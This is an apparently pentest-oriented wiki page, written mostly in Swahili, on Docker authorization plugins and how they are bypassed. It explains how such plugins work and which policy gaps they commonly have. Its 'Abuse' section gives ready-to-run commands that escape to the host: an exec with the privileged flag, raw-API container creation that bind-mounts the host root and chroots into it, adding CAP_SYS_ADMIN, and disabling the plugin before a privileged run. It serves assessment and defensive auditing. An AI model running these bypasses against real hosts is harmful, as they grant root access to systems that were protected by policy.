# Runtime Authorization Plugins

## Overview

Runtime authorization plugins ni safu ya ziada ya policy inayoamua ikiwa caller anaweza kutekeleza daemon action fulani. Docker ni mfano wa kawaida. Kwa default, mtu yeyote anayeweza kuwasiliana na Docker daemon huwa na control pana juu yake. Authorization plugins hujaribu kupunguza hali hiyo kwa kuchunguza user aliyethibitishwa na API operation iliyoombwa, kisha kuruhusu au kukataa request kulingana na policy.

Mada hii inahitaji ukurasa wake kwa sababu hubadilisha exploitation model wakati attacker tayari ana access ya Docker API au ya user aliye kwenye `docker` group. Katika mazingira hayo, swali si tena tu "naweza kufikia daemon?" bali pia "je, daemon imelindwa na authorization layer, na ikiwa ndivyo, je, layer hiyo inaweza kubypass kupitia endpoints ambazo hazijashughulikiwa, JSON parsing dhaifu, au permissions za plugin-management?"

## Operation

Request inapofika kwenye Docker daemon, authorization subsystem inaweza kupitisha request context kwa plugin moja au zaidi zilizosakinishwa. Plugin huona authenticated user identity, request details, headers zilizochaguliwa, na sehemu za request au response body wakati content type inafaa. Plugins nyingi zinaweza kuunganishwa, na access hutolewa tu ikiwa plugins zote zimeruhusu request.

Model hii inaonekana kuwa imara, lakini usalama wake hutegemea kabisa jinsi policy author alivyoielewa API kwa ukamilifu. Plugin inayozuia `docker run --privileged` lakini ikapuuza `docker exec`, ikakosa alternate JSON keys kama vile top-level `Binds`, au ikaruhusu plugin administration inaweza kuunda hisia ya ulinzi wa uongo huku ikiwa bado inaacha direct privilege-escalation paths wazi.

## Common Plugin Targets

Maeneo muhimu ya kukagua policy ni:

- container creation endpoints
- `HostConfig` fields kama vile `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, na namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- endpoint yoyote inayoweza kuanzisha runtime actions kwa njia isiyo ya moja kwa moja nje ya intended policy model

Kihistoria, mifano kama Twistlock's `authz` plugin na plugins rahisi za kielimu kama `authobot` ilifanya model hii iwe rahisi kujifunza kwa sababu policy files na code paths zao zilionyesha jinsi endpoint-to-action mapping ilivyotekelezwa. Kwa assessment work, somo muhimu ni kwamba policy author lazima aelewe API surface yote badala ya command za CLI zinazoonekana zaidi.

## Abuse

Lengo la kwanza ni kujua ni nini hasa kimezuiwa. Ikiwa daemon inakataa action, error mara nyingi hu-leak jina la plugin, jambo linalosaidia kutambua control inayotumika:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ikiwa unahitaji endpoint profiling pana zaidi, tools kama `docker_auth_profiler` ni muhimu kwa sababu zinafanya kiotomatiki kazi inayojirudia ya kukagua ni API routes na JSON structures zipi zinaruhusiwa na plugin.

Ikiwa mazingira yanatumia plugin maalum na unaweza kuwasiliana na API, orodhesha ni object fields zipi hasa zinachujwa:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ukaguzi huu ni muhimu kwa sababu kushindwa kwa uidhinishaji mara nyingi hutegemea sehemu maalum badala ya dhana kwa ujumla. Plugin inaweza kukataa muundo wa CLI bila kuzuia kikamilifu muundo sawa wa API.

### Mfano Kamili: `docker exec` Huongeza Privilege Baada ya Kuundwa kwa Container

Sera inayozuia uundaji wa container yenye privilege lakini inaruhusu uundaji wa container bila vizuizi pamoja na `docker exec` bado inaweza kukwepwa:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ikiwa daemon inakubali hatua ya pili, mtumiaji amerejesha mchakato shirikishi wenye mamlaka ndani ya container ambayo mwandishi wa policy aliamini kuwa imewekewa vizuizi.

### Mfano Kamili: Bind Mount Kupitia Raw API

Baadhi ya policy zilizovunjika hukagua umbo moja tu la JSON. Ikiwa bind mount ya root filesystem haijazuiwa kwa uthabiti, host bado inaweza ku-mountiwa:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Wazo hilo pia linaweza kuonekana chini ya `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Athari ni **host filesystem escape** kamili. Jambo la kuvutia ni kwamba bypass inatokana na coverage isiyokamilika ya policy badala ya bug ya kernel.

### Mfano Kamili: Unchecked Capability Attribute

Ikiwa policy itasahau kuchuja attribute inayohusiana na capability, attacker anaweza kuunda container inayopata tena capability hatari:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Mara `CAP_SYS_ADMIN` au capability yenye nguvu kama hiyo inapokuwepo, mbinu nyingi za breakout zilizoelezwa katika [capabilities.md](protections/capabilities.md) na [privileged-containers.md](privileged-containers.md) huwa zinaweza kufikiwa.

### Mfano Kamili: Kuzima Plugin

Ikiwa operesheni za usimamizi wa plugin zinaruhusiwa, bypass iliyo safi zaidi inaweza kuwa kuzima udhibiti huo kabisa:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Hili ni hitilafu ya policy katika kiwango cha control-plane. Authorization layer ipo, lakini mtumiaji ambaye ilikusudiwa kumzuia bado ana ruhusa ya kuizima.

## Ukaguzi

Amri hizi zinalenga kubaini ikiwa policy layer ipo na ikiwa inaonekana kuwa kamili au ya juu juu.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Kinachovutia hapa:

- Ujumbe wa kukataliwa unaojumuisha jina la plugin unathibitisha kuwepo kwa authorization layer na mara nyingi hufichua implementation halisi.
- Orodha ya plugin inayoonekana kwa attacker inaweza kutosha kubaini ikiwa operesheni za disable au reconfigure zinawezekana.
- Policy inayozuia tu vitendo vya CLI vilivyo wazi, lakini si raw API requests, inapaswa kuchukuliwa kuwa inaweza kubypassiwa hadi ithibitishwe vinginevyo.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Haijawezeshwa kwa default | Daemon access kwa ufanisi ni all-or-nothing isipokuwa authorization plugin iwe imesanidiwa | incomplete plugin policy, blacklists badala ya allowlists, kuruhusu plugin management, field-level blind spots |
| Podman | Si equivalent ya moja kwa moja iliyo ya kawaida | Podman kwa kawaida hutegemea zaidi Unix permissions, rootless execution, na maamuzi ya API exposure kuliko Docker-style authz plugins | ku-expose rootful Podman API kwa upana, weak socket permissions |
| containerd / CRI-O | Control model tofauti | Runtimes hizi kwa kawaida hutegemea socket permissions, node trust boundaries, na higher-layer orchestrator controls badala ya Docker authz plugins | kumount socket ndani ya workloads, weak node-local trust assumptions |
| Kubernetes | Hutumia authn/authz katika API-server na kubelet layers, si Docker authz plugins | Cluster RBAC na admission controls ndizo policy layer kuu | overbroad RBAC, weak admission policy, ku-expose kubelet au runtime APIs moja kwa moja |

{{#include ../../../banners/hacktricks-training.md}}
